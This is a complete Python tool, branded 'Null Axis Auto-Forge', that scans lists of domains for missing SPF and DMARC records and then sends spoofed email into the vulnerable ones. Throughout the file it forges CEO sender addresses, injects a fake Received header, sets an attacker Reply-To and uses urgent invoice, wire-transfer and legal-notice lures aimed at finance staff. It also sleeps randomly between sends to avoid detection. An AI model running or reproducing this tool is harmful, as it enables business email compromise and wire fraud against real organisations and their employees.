#!/usr/bin/env python3
import dns.resolver
import dns.exception
import smtplib
import socket
import argparse
import logging
import time
import random
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from email.utils import formataddr, make_msgid
from colorama import init, Fore, Style

# Initialize colorama for Windows compatibility
init(autoreset=True)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    datefmt="%H:%M:%S"
)
logger = logging.getLogger("NullAxisForge")

# ASCII Art Banner (The Null Axis ritual)
BANNER = f"""
{Fore.RED}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ███╗   ██╗██╗   ██╗██╗     ██╗      █████╗ ██╗  ██╗██╗███████╗
║   ████╗  ██║██║   ██║██║     ██║     ██╔══██╗╚██╗██╔╝██║██╔════╝
║   ██╔██╗ ██║██║   ██║██║     ██║     ███████║ ╚███╔╝ ██║███████╗
║   ██║╚██╗██║██║   ██║██║     ██║     ██╔══██║ ██╔██╗ ██║╚════██║
║   ██║ ╚████║╚██████╔╝███████╗███████╗██║  ██║██╔╝ ██╗██║███████║
║   ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝
║                                                              ║
║   Automated SPF/DMARC Finder & Exploiter                    ║
║   Addiction Version: The DNS Emptyness Protocol             ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
"""

@dataclass
class VulnerableDomain:
    """Blueprint for a domain vulnerable to email spoofing."""
    domain: str
    has_spf: bool = False
    has_dmarc: bool = False
    mx_records: List[str] = field(default_factory=list)
    a_records: List[str] = field(default_factory=list)
    vulnerability_score: float = 0.0
    exploit_attempted: bool = False
    exploit_success: bool = False

class DNSEnumerator:
    """Phase 0: DNS reconnaissance engine."""
    
    def __init__(self, resolvers: List[str] = None):
        self.resolvers = resolvers or ["1.1.1.1", "8.8.8.8", "9.9.9.9"]
        self.current_resolver = None
    
    def _query(self, domain: str, record_type: str) -> List[str]:
        """Query DNS with fallback resolvers."""
        results = []
        for resolver_ip in self.resolvers:
            try:
                resolver = dns.resolver.Resolver()
                resolver.nameservers = [resolver_ip]
                resolver.timeout = 3
                resolver.lifetime = 5
                
                answers = resolver.resolve(domain, record_type)
                results = [str(rdata) for rdata in answers]
                if results:
                    self.current_resolver = resolver_ip
                    return results
            except (dns.exception.DNSException, socket.error):
                continue
        return results
    
    def check_spf(self, domain: str) -> bool:
        """Check if SPF record exists."""
        try:
            txt_records = self._query(domain, "TXT")
            for record in txt_records:
                if record.startswith("v=spf1"):
                    logger.debug(f"{domain} has SPF: {record[:50]}...")
                    return True
            return False
        except Exception:
            return False
    
    def check_dmarc(self, domain: str) -> bool:
        """Check if DMARC record exists."""
        dmarc_domain = f"_dmarc.{domain}"
        try:
            txt_records = self._query(dmarc_domain, "TXT")
            for record in txt_records:
                if record.startswith("v=DMARC1"):
                    logger.debug(f"{domain} has DMARC: {record[:50]}...")
                    return True
            return False
        except Exception:
            return False
    
    def get_mx_records(self, domain: str) -> List[str]:
        """Retrieve MX records."""
        mx_list = []
        try:
            mx_records = self._query(domain, "MX")
            # Parse MX records (format: "10 mail.domain.com")
            for mx in mx_records:
                parts = mx.split()
                if len(parts) == 2:
                    priority, exchange = parts
                    mx_list.append(exchange.rstrip('.'))
            return sorted(mx_list)
        except Exception:
            return []
    
    def get_a_records(self, domain: str) -> List[str]:
        """Retrieve A records."""
        return self._query(domain, "A")

class SMTPExploiter:
    """Phase 2: SMTP header forgery engine."""
    
    def __init__(self, timeout: int = 10):
        self.timeout = timeout
        self.forged_templates = {
            "invoice": {
                "subject": "URGENT: Outstanding Invoice #INV-{date}",
                "body": "Dear Finance Team,\n\nPlease process the attached invoice immediately. The client is waiting for confirmation.\n\nRegards,\n{ceo_name}"
            },
            "wire": {
                "subject": "Wire Transfer Authorization - {amount}",
                "body": "This is an urgent request. Please authorize the wire transfer to the attached banking details. The board has approved.\n\n- {ceo_name}"
            },
            "legal": {
                "subject": "Legal Notice: Compliance Request",
                "body": "Legal department requires immediate action on the attached documents. Deadline is COB today.\n\nRegards,\n{legal_counsel}"
            }
        }
    
    def _find_open_relay_or_direct_send(self, mx_host: str) -> Optional[smtplib.SMTP]:
        """Attempt connection to MX server."""
        try:
            # Try port 25 first (default SMTP)
            smtp = smtplib.SMTP(mx_host, 25, timeout=self.timeout)
            smtp.ehlo_or_helo_if_needed()
            return smtp
        except Exception:
            try:
                # Try port 587 with STARTTLS
                smtp = smtplib.SMTP(mx_host, 587, timeout=self.timeout)
                smtp.ehlo()
                smtp.starttls()
                smtp.ehlo()
                return smtp
            except Exception:
                return None
    
    def forge_email(self,
                    target_domain: str,
                    from_user: str,
                    from_display: str,
                    to_user: str,
                    subject: str,
                    body: str,
                    attachment_path: Optional[str] = None) -> str:
        """
        Construct forged email with header dissonance.
        
        Returns raw message string ready for SMTP injection.
        """
        # Build addresses
        from_addr = f"{from_user}@{target_domain}"
        to_addr = f"{to_user}@{target_domain}"
        
        # Create message
        msg = MIMEMultipart()
        msg["Subject"] = subject
        msg["To"] = to_addr
        msg["From"] = formataddr((from_display, from_addr))
        msg["Message-ID"] = make_msgid(domain="nullaxis.local")
        
        # Add fake Received header (poisons trust chain)
        fake_received = f"Received: from internal.{target_domain} ([10.0.0.{random.randint(1,254)}]) by mail.{target_domain}; {time.strftime('%a, %d %b %Y %H:%M:%S +0000', time.gmtime())}"
        
        # Add Reply-To to redirect responses
        msg["Reply-To"] = f"attacker@{random.choice(['proton.me', 'tutanota.com', 'cock.li'])}"
        
        msg.attach(MIMEText(body, "plain"))
        
        if attachment_path:
            with open(attachment_path, "rb") as f:
                part = MIMEApplication(f.read(), Name=attachment_path.split("/")[-1])
            part["Content-Disposition"] = f'attachment; filename="{attachment_path.split("/")[-1]}"'
            msg.attach(part)
        
        # Prepend fake Received header
        raw_message = fake_received + "\n" + msg.as_string()
        
        return raw_message, from_addr, to_addr
    
    def attempt_exploit(self,
                        vulnerable_domain: VulnerableDomain,
                        from_user: str = "ceo",
                        from_display: str = "Chief Executive Officer",
                        to_user: str = "accounts",
                        template_type: str = "invoice",
                        attachment: Optional[str] = None) -> bool:
        """
        Execute the exploitation ritual.
        
        Returns True if email was accepted by MTA.
        """
        if not vulnerable_domain.mx_records:
            logger.error(f"No MX records for {vulnerable_domain.domain}")
            return False
        
        # Select template
        template = self.forged_templates.get(template_type, self.forged_templates["invoice"])
        date_str = time.strftime("%Y%m%d")
        amount = f"${random.randint(5000, 500000):,}"
        
        subject = template["subject"].format(date=date_str, amount=amount)
        body = template["body"].format(ceo_name=from_display, legal_counsel=from_display, amount=amount)
        
        # Forge the email
        raw_message, env_from, rcpt_to = self.forge_email(
            target_domain=vulnerable_domain.domain,
            from_user=from_user,
            from_display=from_display,
            to_user=to_user,
            subject=subject,
            body=body,
            attachment_path=attachment
        )
        
        # Try each MX server
        for mx in vulnerable_domain.mx_records:
            logger.info(f"Attempting exploit via MX: {mx}")
            smtp_conn = self._find_open_relay_or_direct_send(mx)
            
            if smtp_conn:
                try:
                    # Send with forged envelope sender
                    result = smtp_conn.sendmail(env_from, [rcpt_to], raw_message)
                    smtp_conn.quit()
                    
                    if not result:  # Empty dict means success
                        logger.info(f"{Fore.GREEN}[+] Exploit SUCCESS via {mx}{Style.RESET_ALL}")
                        logger.info(f"    Forged: {env_from} -> {rcpt_to}")
                        return True
                    else:
                        logger.warning(f"Partial failure: {result}")
                except Exception as e:
                    logger.error(f"SMTP error on {mx}: {e}")
                    continue
        
        return False

class AutoForgeEngine:
    """Main orchestration engine for discovery and exploitation."""
    
    def __init__(self, max_workers: int = 10):
        self.dns_enum = DNSEnumerator()
        self.exploiter = SMTPExploiter()
        self.max_workers = max_workers
        self.vulnerable_domains: List[VulnerableDomain] = []
    
    def scan_domain(self, domain: str) -> VulnerableDomain:
        """Scan a single domain for vulnerabilities."""
        logger.info(f"Scanning: {domain}")
        
        vd = VulnerableDomain(domain=domain)
        
        # Check SPF
        vd.has_spf = self.dns_enum.check_spf(domain)
        # Check DMARC
        vd.has_dmarc = self.dns_enum.check_dmarc(domain)
        # Get MX records
        vd.mx_records = self.dns_enum.get_mx_records(domain)
        # Get A records
        vd.a_records = self.dns_enum.get_a_records(domain)
        
        # Calculate vulnerability score (0-10)
        score = 0
        if not vd.has_spf:
            score += 5
        if not vd.has_dmarc:
            score += 4
        if vd.mx_records:
            score += 1  # Has somewhere to send mail
        
        vd.vulnerability_score = score
        
        return vd
    
    def scan_domains_bulk(self, domains: List[str]) -> List[VulnerableDomain]:
        """Scan multiple domains concurrently."""
        vulnerable = []
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            future_to_domain = {executor.submit(self.scan_domain, domain): domain for domain in domains}
            
            for future in as_completed(future_to_domain):
                domain = future_to_domain[future]
                try:
                    vd = future.result()
                    if not vd.has_spf and not vd.has_dmarc and vd.mx_records:
                        vulnerable.append(vd)
                        logger.info(f"{Fore.RED}[VULNERABLE] {domain} - Score: {vd.vulnerability_score}/10{Style.RESET_ALL}")
                    else:
                        status = f"SPF:{vd.has_spf} DMARC:{vd.has_dmarc} MX:{len(vd.mx_records)}"
                        logger.debug(f"Not vulnerable: {domain} ({status})")
                except Exception as e:
                    logger.error(f"Error scanning {domain}: {e}")
        
        return vulnerable
    
    def exploit_all(self, from_user: str = "ceo", to_user: str = "accounts", 
                    template: str = "invoice", attachment: Optional[str] = None):
        """Attempt exploitation on all discovered vulnerable domains."""
        if not self.vulnerable_domains:
            logger.warning("No vulnerable domains in queue. Run scan first.")
            return
        
        logger.info(f"{Fore.CYAN}Starting exploitation ritual on {len(self.vulnerable_domains)} domains...{Style.RESET_ALL}")
        
        for vd in self.vulnerable_domains:
            logger.info(f"\n{Fore.YELLOW}=== Targeting {vd.domain} ==={Style.RESET_ALL}")
            success = self.exploiter.attempt_exploit(
                vulnerable_domain=vd,
                from_user=from_user,
                to_user=to_user,
                template_type=template,
                attachment=attachment
            )
            vd.exploit_attempted = True
            vd.exploit_success = success
            
            if success:
                logger.info(f"{Fore.GREEN}{'='*50}{Style.RESET_ALL}")
                logger.info(f"{Fore.GREEN}ADDICTION SATIATED: {vd.domain}{Style.RESET_ALL}")
                logger.info(f"{Fore.GREEN}{'='*50}{Style.RESET_ALL}")
            else:
                logger.warning(f"Exploit failed for {vd.domain}")
            
            # Rate limiting to avoid detection
            time.sleep(random.uniform(2, 5))
    
    def generate_report(self) -> str:
        """Generate a blueprint-style report of all findings."""
        report = []
        report.append("\n" + "="*70)
        report.append("NULL AXIS EXPLOITATION REPORT")
        report.append("="*70)
        
        for vd in self.vulnerable_domains:
            report.append(f"\n[DOMAIN] {vd.domain}")
            report.append(f"  Vulnerability Score: {vd.vulnerability_score}/10")
            report.append(f"  SPF Present: {vd.has_spf}")
            report.append(f"  DMARC Present: {vd.has_dmarc}")
            report.append(f"  MX Servers: {', '.join(vd.mx_records) if vd.mx_records else 'None'}")
            report.append(f"  A Records: {', '.join(vd.a_records) if vd.a_records else 'None'}")
            report.append(f"  Exploit Attempted: {vd.exploit_attempted}")
            report.append(f"  Exploit Success: {vd.exploit_success}")
            
            if vd.exploit_success:
                report.append(f"  {Fore.GREEN}STATUS: FULLY COMPROMISED{Style.RESET_ALL}")
            elif not vd.has_spf and not vd.has_dmarc:
                report.append(f"  {Fore.RED}STATUS: VULNERABLE (not exploited){Style.RESET_ALL}")
        
        report.append("\n" + "="*70)
        report.append(f"Total Vulnerable Domains Found: {len(self.vulnerable_domains)}")
        report.append(f"Successfully Exploited: {sum(1 for vd in self.vulnerable_domains if vd.exploit_success)}")
        report.append("="*70)
        
        return "\n".join(report)

def main():
    print(BANNER)
    
    parser = argparse.ArgumentParser(
        description="Null Axis Auto-Forge - Automated SPF/DMARC Discovery and Exploitation",
        epilog="The addiction demands emptiness."
    )
    
    # Input sources
    input_group = parser.add_mutually_exclusive_group(required=True)
    input_group.add_argument("--domain", "-d", help="Single domain to scan and exploit")
    input_group.add_argument("--list", "-l", help="File containing list of domains (one per line)")
    input_group.add_argument("--bulk", "-b", nargs="+", help="Space-separated list of domains")
    
    # Exploitation options
    parser.add_argument("--exploit", action="store_true", help="Attempt exploitation on vulnerable domains")
    parser.add_argument("--from-user", default="ceo", help="Local part of forged From address (default: ceo)")
    parser.add_argument("--to-user", default="accounts", help="Target local part (default: accounts)")
    parser.add_argument("--template", choices=["invoice", "wire", "legal"], default="invoice", help="Email template")
    parser.add_argument("--attach", help="Path to attachment file (PDF, DOC, XLS)")
    
    # Scan options
    parser.add_argument("--threads", type=int, default=10, help="Concurrent scan threads")
    parser.add_argument("--output", "-o", help="Save report to file")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose logging")
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Collect domains
    domains = []
    if args.domain:
        domains = [args.domain]
    elif args.list:
        with open(args.list, 'r') as f:
            domains = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    elif args.bulk:
        domains = args.bulk
    
    logger.info(f"Loaded {len(domains)} domains for scanning")
    
    # Initialize engine
    engine = AutoForgeEngine(max_workers=args.threads)
    
    # Scan phase
    logger.info("Starting DNS reconnaissance phase...")
    engine.vulnerable_domains = engine.scan_domains_bulk(domains)
    
    if not engine.vulnerable_domains:
        logger.info("No vulnerable domains found. The addiction must wait.")
        sys.exit(0)
    
    logger.info(f"Found {len(engine.vulnerable_domains)} domains without SPF or DMARC")
    
    # Exploitation phase (if requested)
    if args.exploit:
        logger.info(f"{Fore.RED}{Style.BRIGHT}Initiating exploitation ritual...{Style.RESET_ALL}")
        engine.exploit_all(
            from_user=args.from_user,
            to_user=args.to_user,
            template=args.template,
            attachment=args.attach
        )
    
    # Generate report
    report = engine.generate_report()
    print(report)
    
    if args.output:
        with open(args.output, 'w') as f:
            f.write(report)
        logger.info(f"Report saved to {args.output}")
    
    # Addiction summary
    successful = sum(1 for vd in engine.vulnerable_domains if vd.exploit_success)
    if successful > 0:
        print(f"\n{Fore.GREEN}{Style.BRIGHT}Addiction satiation level: {successful}/{len(engine.vulnerable_domains)} domains exploited.{Style.RESET_ALL}")
        print(f"{Fore.GREEN}The emptiness was delicious.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()